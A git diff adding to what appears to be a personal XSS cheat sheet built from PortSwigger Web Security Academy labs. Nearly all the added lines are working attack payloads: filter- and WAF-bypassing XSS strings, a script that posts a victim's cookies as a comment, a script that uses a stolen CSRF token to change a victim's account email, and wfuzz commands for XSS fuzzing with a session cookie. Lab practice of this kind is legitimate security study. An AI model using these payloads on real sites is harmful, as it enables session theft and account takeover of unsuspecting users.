@@ -20,11 +20,108 @@ python3 -m http.server 80
 
 javascript:alert(document.cookie)
 
+hacked" onmouseover='alert(1)'
+
+' - alert(1) - '
+
+<iframe src="https://0ae100cb03a80c9080b70dbd0066002b.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 ```
 
+### Portswigger Practitioner
+```
+document.write sink using source location.search inside a select element:
+productId=1&storeId=</option></select><script>alert('XSS')</script>
+
+AngularJS expression:
+{{$on.constructor('alert(1)')()}}
+
+Reflected DOM XSS:
+\"-alert(1)}//
+
+Stored DOM XSS in Blog Post - JavaScript replace():
+<><img src=1 onerror=alert(1)>
+
+Reflected XSS that bypasses the WAF and calls the print() function:
+<iframe src="https://0a92004d038bfd0a808fa47300a00085.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+
+Reflected XSS into HTML context with all tags blocked except custom ones:
+<script>
+location = 'https://0a6300d104a2a205823639e3009e002b.web-security-academy.net//?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+
+Reflected XSS with some SVG markup allowed:
+https://0ae0007e03162c8b85361ee200bc00de.h1-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+
+Reflected XSS in canonical link tag
+https://0a7b00d704ecf89480f0852100a90095.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
+
+Reflected XSS into a JavaScript string with single quote and backslash escaped:
+</script><script>alert(1)</script>
+
+Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped:
+\'-alert(1)//
+```
+
+-  Exploiting cross-site scripting to steal cookies
+```
+<script>
+window.addEventListener('DOMContentLoaded', function(){
+	var token = document.getElementsByName('csrf')[0].value;
+	var data = new FormData();
+
+	data.append('csrf', token);
+	data.append('postId', 8);
+	data.append('comment', document.cookie);
+	data.append('name', 'victim');
+	data.append('email', 'z3nsh3ll@gmail.com');
+	data.append('website', 'http://www.zenshell.ninja');
+
+	fetch('/post/comment', {
+	    method: 'POST',
+	    mode: 'no-cors',
+	    body: data
+	});
+
+});
+</script>
+```
+
+- Exploiting XSS to bypass CSRF defenses
+```
+<script>
+window.addEventListener('DOMContentLoaded', function(){
+    var token = document.getElementsByName('csrf')[0].value;
+
+    var data = new FormData();
+    data.append('csrf', token);
+    data.append('email', 'evil@hacker.net');
+
+    fetch('/my-account/change-email', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: data
+    });
+});
+</script>
+```
+
+
 ### XSS Fuzzing
+GET:
 ```
 wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "http://example.com/index.php?id=FUZZ"
+```
+
+POST:
+```
+wfuzz -c \
+  -z file,/usr/share/seclists/Fuzzing/XSS/human-friendly/XSS-Jhaddix.txt \
+  --hh 0 \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -b "session=wFUS8t2EVdxhNhDecZZfOYIqA3Jdq81K" \
+  -d "csrf=nLFfUhKnGr82waCONvvO6Wxh4B5ZfjJx&postId=5&comment=FUZZ&name=Amrit&email=a%40b.com&website=https%3A%2F%2Fwww.google.com" \
+  "https://0acc003003a53e0c80b208660013005f.web-security-academy.net/post/comment"
 ```
 
 ### Stealing Cookie
